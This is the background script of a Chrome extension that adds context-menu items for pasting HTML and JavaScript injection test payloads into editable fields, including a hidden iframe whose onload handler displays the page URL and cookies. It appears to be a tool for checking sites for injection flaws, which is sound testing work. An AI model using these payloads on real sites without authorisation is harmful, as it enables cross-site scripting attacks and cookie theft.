var simplehtmlMenuItem = {
    "id": "injectSimplehtml",
    "title": "Inject Simple HTML Heading",
    "contexts": ["editable"]
};

var simpleJSMenuItem = {
    "id": "injectSimpleJS",
    "title": "Inject Simple JS Alert",
    "contexts": ["editable"]
};

var iframeMenuItem = {
    "id": "injectIFrame",
    "title": "Inject IFrame HTML that tries to grab URL and cookies",
    "contexts": ["editable"]
};

chrome.contextMenus.create(simplehtmlMenuItem);
chrome.contextMenus.create(simpleJSMenuItem);
chrome.contextMenus.create(iframeMenuItem);

// on click, fill editable with the script
chrome.contextMenus.onClicked.addListener(function(info, tab) {
    var tArea = document.createElement('textarea'), _frame = null;
    document.body.appendChild(tArea);
    if (info.menuItemId === "injectIFrame") {
        tArea.value = '<iframe onload="alert(\'I AM VULNERABLE TO JS INJECTION\\nMY URL IS: \' + document.URL +\'\\nMY COOKIES ARE: \' + document.cookies)" style="display:none"></iframe>';
    }
    else if (info.menuItemId === "injectSimplehtml") {
        tArea.value = '<h1 style="background-color:tomato;">I AM VULNERABLE TO SIMPLE HTML INJECTION</h1>';
    } else if (info.menuItemId === "injectSimpleJS") {
        tArea.value = '<script>alert("I AM VULNERABLE TO SIMPLE JS INJECTION")</script>';
    }
    tArea.focus();
    tArea.select();
    document.execCommand('copy');

    if(info.frameId) _frame = info.frameId;

    chrome.tabs.executeScript(tab.id, {frameId: _frame, matchAboutBlank: true, code: 
        "document.execCommand('paste');"
    }, function() {
        if (chrome.runtime.lastError) console.log(chrome.runtime.lastError);
        document.body.removeChild(tArea);
    });     
});